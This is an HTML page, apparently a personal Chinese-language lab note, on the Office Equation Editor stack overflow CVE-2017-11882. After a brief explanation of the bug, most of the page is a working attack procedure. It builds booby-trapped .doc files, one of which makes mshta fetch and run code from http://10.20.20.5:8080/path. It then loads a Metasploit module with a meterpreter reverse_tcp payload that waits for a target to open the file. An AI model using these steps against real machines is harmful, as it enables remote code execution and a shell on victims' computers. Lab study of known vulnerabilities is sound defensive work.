<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2023-02-02 Thu 21:55 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2017-11882</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />

                     <!--
                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
                     -->
                     <!--
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
                     -->
                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
                     <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">CVE-2017-11882</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org4da951e">Introduction</a>
<ul>
<li><a href="#orgfcd274c">步骤</a></li>
<li><a href="#orgd6de167">参考链接</a></li>
</ul>
</li>
</ul>
</div>
</nav>

<div id="outline-container-org4da951e" class="outline-2">
<h2 id="org4da951e">Introduction</h2>
<div class="outline-text-2" id="text-org4da951e">
<p>
CVE-2017-1188 是微软公布的一个远程执行漏洞，通杀目前市面上的所有 office 版本及 Windows 操作系统。该漏洞的成因是 EQNEDT32.EXE 进程在读入包含 MathType 的 ole 数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。上次出现这么典型的 office 栈溢出漏洞是著名的 CVE-2012-0158。
</p>

<ul class="org-ul">
<li>Tool: Kali Rolling x64</li>
<li>Target Machine: Windows 7 Ultimate x64</li>
<li>Target Software: Microsoft Office 2010 Professional Plus</li>
</ul>
</div>

<div id="outline-container-orgfcd274c" class="outline-3">
<h3 id="orgfcd274c">步骤</h3>
<div class="outline-text-3" id="text-orgfcd274c">
<ol class="org-ol">
<li><p>
Bash
</p>
<div class="org-src-container">
<pre class="src src-bash">unzip CVE-2017-11882.zip
python CVE-2017-11882/cve-2017-11882.py -c "cmd.exe /c calc.exe" -c "calc.doc" # test
python CVE-2017-11882/cve-2017-11882.py -c "mshta http://10.20.20.5:8080/path" -c "classTable.doc"
cp CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
cp CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
</pre>
</div></li>

<li><p>
msfconsole
</p>
<div class="org-src-container">
<pre class="src src-bash">reload_all
search CVE-2017-11882
use exploit/windows/smb/cve_2017_11882
set payload windows/meterpreter/reverse_tcp
set lhost 10.20.20.5
set uripath path
run # exploit
# wait for target to open the 'classTable.doc' documnet
# open or edit the 'calc.doc' will open calc.exe in Windows 7
# but only edit the 'calc.doc' will open calc.exe in Windows 10
# PS: Windows 10 must close Windows Defender
</pre>
</div></li>
</ol>
</div>
</div>

<div id="outline-container-orgd6de167" class="outline-3">
<h3 id="orgd6de167">参考链接</h3>
<div class="outline-text-3" id="text-orgd6de167">
<p>
<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882">cve.mitre.org</a>
<a href="https://www.freebuf.com/vuls/154462.html">www.freebuf.com</a>
<a href="https://github.com/embedi/CVE-2017-11882">CVE-2017-11882.zip</a>
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">

                     Theme
                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow/readtheorg</a>
                     by
                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
                     <br>
                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>